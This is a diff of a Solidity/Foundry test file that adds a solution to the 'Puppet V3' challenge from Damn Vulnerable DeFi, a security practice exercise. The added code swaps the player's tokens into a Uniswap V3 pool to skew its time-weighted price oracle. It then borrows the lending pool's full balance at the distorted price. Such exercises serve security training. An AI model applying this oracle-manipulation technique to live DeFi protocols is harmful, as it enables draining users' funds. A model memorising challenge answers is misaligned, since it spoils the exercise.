@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,29 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        ISwapRouter uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );
+
+        vm.warp(block.timestamp + 114);
+
+        weth.approve(
+            address(lendingPool),
+            lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
+        );
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
@@ -128,7 +151,11 @@ contract PuppetV3Challenge is Test {
     function _isSolved() private view {
         assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
         assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
-        assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            LENDING_POOL_INITIAL_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 
     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
